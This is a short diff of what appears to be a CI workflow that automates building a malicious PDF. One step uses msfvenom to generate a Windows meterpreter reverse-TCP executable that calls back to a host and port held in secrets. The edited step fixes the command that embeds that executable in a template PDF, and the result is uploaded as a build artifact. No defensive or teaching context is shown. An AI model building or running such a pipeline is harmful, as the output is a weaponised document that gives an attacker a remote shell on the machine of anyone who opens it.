@@ -23,7 +23,7 @@ jobs:
           msfvenom -p windows/meterpreter/reverse_tcp LHOST="${{ secrets.LHOST }}" LPORT="${{ secrets.LPORT }}" -f exe -o shell.exe
 
       - name: Embed payload in PDF
-        run: pdfattach shell.exe template.pdf payload.pdf
+        run: pdfattach template.pdf shell.exe payload.pdf
 
       - name: Upload PDF artifact
         uses: actions/upload-artifact@v4
